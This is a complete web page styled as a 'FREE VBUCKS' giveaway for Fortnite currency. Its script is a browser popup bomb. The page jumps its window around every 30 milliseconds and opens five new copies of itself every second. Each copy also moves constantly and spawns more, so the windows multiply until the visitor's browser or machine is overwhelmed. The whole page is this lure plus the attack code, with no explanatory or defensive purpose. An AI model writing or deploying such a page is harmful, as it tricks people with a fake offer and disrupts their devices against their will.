<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>FREE VBUCKS!!!!</title>
  <style>
    body {
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #ff0000;
      font-size: 3rem;
      color: white;
      text-align: center;
    }
  </style>
</head>
<body>

  <div>FREE VBUCKS!!!!</div>

  <script>
    function moveWindow() {
      const x = Math.random() * (window.screen.availWidth - window.outerWidth);
      const y = Math.random() * (window.screen.availHeight - window.outerHeight);
      window.moveTo(x, y);
      setTimeout(moveWindow, 30); // Moves the window faster
    }

    function spawnWindows() {
      for (let i = 0; i < 5; i++) { // Spawns 5 popups each time
        const newWindow = window.open(
          window.location.href,
          '_blank',
          'width=400,height=400'
        );
        if (newWindow) {
          setInterval(() => {
            const x = Math.random() * (window.screen.availWidth - 400);
            const y = Math.random() * (window.screen.availHeight - 400);
            newWindow.moveTo(x, y);
          }, 50); // Makes popups move constantly
        }
      }
      setTimeout(spawnWindows, 1000); // Spawns new windows every second
    }

    moveWindow();
    setTimeout(spawnWindows, 1000); // Start spawning windows after 1 second
  </script>

</body>
</html>
